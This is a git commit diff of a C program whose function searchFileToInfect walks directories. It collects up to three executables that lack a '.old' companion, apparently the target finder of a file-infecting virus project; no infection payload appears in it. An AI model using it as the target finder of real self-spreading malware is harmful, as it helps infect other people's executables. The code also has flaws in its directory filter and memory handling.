7eaa1990149db3fde3e3e278a1043284028478e8
Brenckle Gaetan <gaetan.brenckle@outlook.fr>
2021-03-16 20:08:03 +0100

    [SearchFile] work fine

--- RechercheFichier.c
+++ RechercheFichier.c
@@ -7,15 +7,16 @@
 #include <string.h>
 #include <stdbool.h>
 
-#define NB_CIBLES 5
+#define NB_TARGET_MAX 3
 
 typedef struct Element Element;
 struct Element
 {
-    char fichier[200];
     Element *next;
     Element *prev;
+    char path[1];
 };
+
 typedef struct List List;
 struct List
 {
@@ -33,63 +34,67 @@ void printList(List *liste)
         Element *actuel = liste->p;
         while (actuel != NULL)
         {
-            printf("%s\n", actuel->fichier);
+            printf("%s\n", actuel->path);
             actuel = actuel->prev;
         }
     }
 }
 
-List *init(char * file)
+List *init(char *file)
 {
-    List *list = malloc(sizeof(*list));
-    Element *newElem = malloc(sizeof(*newElem));
-    if (list == NULL || newElem == NULL)
-    {
+    List *list = malloc(sizeof(List));
+    Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
+    if (!list || !newElem) {
         exit(EXIT_FAILURE);
     }
-    strcpy(newElem->fichier, file);
+    strcpy(newElem->path, file);
     newElem->next = NULL;
     newElem->prev = NULL;
     list->p = newElem;
     return list;
 }
 
-List* insert(List *list, char* file)
+List* insert(List **list, char* file)
 {
-    if (list == NULL){
-        list = init(file);
-        return list;
+    if (!*list){
+        *list = init(file);
+        return *list;
     }else{
-        Element *newElem = malloc(sizeof(*newElem));
-        if (list == NULL || newElem == NULL)
-        {
+        Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
+        if (!(*list) || !newElem) {
             exit(EXIT_FAILURE);
         }
-        strcpy(newElem->fichier, file);
-        if (!list && !list->p) {
-            list->p->next = newElem;
-        }
-        newElem->prev = list->p;
+        strcpy(newElem->path, file);
+
+        newElem->prev = (*list)->p;
         newElem->next = NULL;
-        list->p = newElem;
+        if (*list && (*list)->p) {
+            (*list)->p->next = newElem;
+        }
+        (*list)->p = newElem;
     }
-    return list;
+    return *list;
 }
 
-bool    deleteItem(List *list, Element *deleteItem) {
-    if (!list && !deleteItem)
+bool    deleteItem(List **list, Element *deleteItem) {
+    if (!*list && !deleteItem)
         return false;
 
-    if (deleteItem->next)
+    if (deleteItem->next) {
         deleteItem->next->prev = deleteItem->prev;
-    if (deleteItem->prev)
+    }
+    if (deleteItem->prev) {
         deleteItem->prev->next = deleteItem->next;
+    }
 
-    if (list->p == deleteItem) {
-        if (deleteItem->next)
-            list->p = deleteItem->next;
-        else if (deleteItem->prev)
-            list->p = deleteItem->prev;
+    if ((*list)->p == deleteItem) {
+        if (deleteItem->next) {
+            (*list)->p = deleteItem->next;
+        } else if (deleteItem->prev) {
+            (*list)->p = deleteItem->prev;
+        } else {
+            (*list)->p = NULL;
+        }
     }
 
     deleteItem->next = NULL;
@@ -100,17 +105,15 @@ bool    deleteItem(List *list, Element *deleteItem) {
 
 bool isInfected(char* file, List *liste)
 {
-    if (liste == NULL)
-    {
+    if (!liste) {
         return false;
     }
-    char cible[200];
-    sprintf(cible,"%s.old",file);
+    char cible[500];
+    char *sufOld = ".old";
+    sprintf(cible,"%s%s",file, sufOld);
     Element *actuel = liste->p;
-    while (actuel != NULL)
-    {
-        if (strcmp(cible, actuel->fichier) == 0)
-        {
+    while (actuel != NULL) {
+        if (strcmp(cible, actuel->path) == 0) {
             return true;
         }
         actuel = actuel->prev;
@@ -118,61 +121,116 @@ bool isInfected(char* file, List *liste)
     return false;
 }
 
-List* recursiveResearch(List* fichiers, List* old, char* PATH, int cibles){
+
+void    reasearch(List **fichiers, List **old, List** dirs) {
     DIR *dirp;
     struct dirent *entry;
     struct stat s;
-
-    dirp = opendir(PATH);
+    char *currentfolder;
     char fichier[500];
 
-    while ((entry = readdir(dirp)) != NULL) {
+    if (*dirs && (*dirs)->p) {
+        currentfolder = (*dirs)->p->path;
+        dirp = opendir(currentfolder);
 
-        sprintf(fichier,"%s/%s",PATH,entry->d_name);
-        //printf("Readdir fichier : %s\n", fichier);
+        while ((entry = readdir(dirp)) != NULL) {
+            sprintf(fichier, "%s/%s", currentfolder, entry->d_name);
+            printf("%s\n", fichier);//TODO
 
-        if (stat(fichier, &s) != -1) {
-            //printf("stat fichier : %s\n", fichier);
+            if (stat(fichier, &s) != -1) {
+                if (S_ISDIR(s.st_mode) && !strstr(entry->d_name, ".") && !strstr(entry->d_name, "..")) {
+                    //TODO ->Passe pas avec des fichiers cachés comme ".idea" (. étant le fichier caché)
+                    printf("isDir : %s\n", fichier); //TODO
+                    insert(dirs, fichier);
 
-            if (S_ISDIR(s.st_mode) && !strstr(entry->d_name,".") && !strstr(entry->d_name,"..") && cibles < NB_CIBLES ) {
-                printf("isDirectory : %s\n", fichier);
-                fichiers = recursiveResearch(fichiers, old, fichier, cibles);
-            }
-            if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
+                } else if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
+                    //TODO ->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
+                    if (!strstr(entry->d_name,".old")) {
+                        printf("isExe : %s\n", fichier); //TODO
+                        insert(fichiers, fichier);
 
-                if (!strstr(entry->d_name,".old") && cibles < NB_CIBLES) //->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
-                {
-                    printf("isExe : %s\n", fichier);
-                    fichiers = insert(fichiers, fichier);
-                    cibles++;
-                }
-                else
-                {
-                    old = insert(old, fichier);
+                    } else {
+                        printf("isOld : %s\n", fichier);
+                        insert(old, fichier);
+                    }
                 }
             }
         }
+        closedir(dirp);
     }
-    
-   if (fichiers)
-    {
-        Element *actuel = fichiers->p;
-        Element *del = NULL;
-        while (actuel)
-        {
-            if (isInfected(actuel->fichier, old)){
-                printf("TEST A SUPPRIMER : %s\n", actuel->fichier);
-                del = actuel;
-                actuel = actuel->prev;
-                deleteItem(fichiers, del);
+}
+
+List    *searchFileToInfect(char *initPath) {
+    List    *targets = NULL;
+    List    *dirs = NULL;
+    List    *files = NULL;
+    List    *olds = NULL;
+
+    Element *currentDir = NULL;
+    int     nbTarget;
+
+    nbTarget = 0;
+    dirs = insert(&dirs, initPath);
+    while ((currentDir = dirs->p) && nbTarget < NB_TARGET_MAX) {
+        printf("\n----------------\nresearch -> [%s]\n-------------\n", dirs->p->path);//TODO
+        reasearch(&files, &olds, &dirs);
+        printf("\n");//TODO
+        deleteItem(&dirs, currentDir);
+
+        if (files) {
+            Element *actualFile = NULL;
+
+            printf("> test old:\n");//TODO
+            while ((actualFile = files->p)) {
+                if (!isInfected(actualFile->path, olds) && nbTarget < NB_TARGET_MAX) {
+                    printf("TEST A CIBLER : %s\n", actualFile->path);//TODO
+                    insert(&targets, actualFile->path);
+                    nbTarget += 1;
+                }
+                //Moyen de ne pas delete et de juste skip si on veux permettre de chercher
+                //un .old qui serait potentiellement plus haut que le fichier actuel
+                deleteItem(&files, actualFile);
             }
-            else
-            {
-                actuel = actuel->prev;
+        }
+
+        //Delete les .old trouvé avant de partir sur un autre dossier
+        if (olds) {
+            printf("\n> delete old\n");//TODO
+            Element *actualOld = NULL;
+            while ((actualOld = olds->p)) {
+                deleteItem(&olds, actualOld);
             }
         }
     }
-    return fichiers;
+
+    if (dirs) {
+        printf("\n> delete dirs\n");//TODO
+        Element *actualDir = NULL;
+        while ((actualDir = dirs->p)) {
+            deleteItem(&dirs, actualDir);
+        }
+        free(dirs);
+    }
+
+    if (files) {
+        printf("\n> delete files\n");//TODO
+        Element *actualFile = NULL;
+        while ((actualFile = files->p)) {
+            deleteItem(&files, actualFile);
+        }
+        free(files);
+    }
+
+    if (olds) {
+        printf("\n> delete old\n");//TODO
+        Element *actualOld = NULL;
+        while ((actualOld = olds->p)) {
+            deleteItem(&olds, actualOld);
+        }
+        free(olds);
+    }
+
+    return targets;
 }
 
 int main(){
@@ -182,11 +240,20 @@ int main(){
         return EXIT_FAILURE;
     }
 
-    List* old = NULL;
-    List* cibles = NULL;
-    cibles = recursiveResearch(cibles, old, PATH, 0);
 
+    List* cibles = NULL;
+    cibles = searchFileToInfect(PATH);
+
+    printf("\n\nresult:\n");
     printList(cibles);
+
+    if (cibles) {
+        Element *actualtarget = NULL;
+        while ((actualtarget = cibles->p)) {
+            deleteItem(&cibles, actualtarget);
+        }
+        free(cibles);
+    }
 
     return EXIT_SUCCESS;
 }
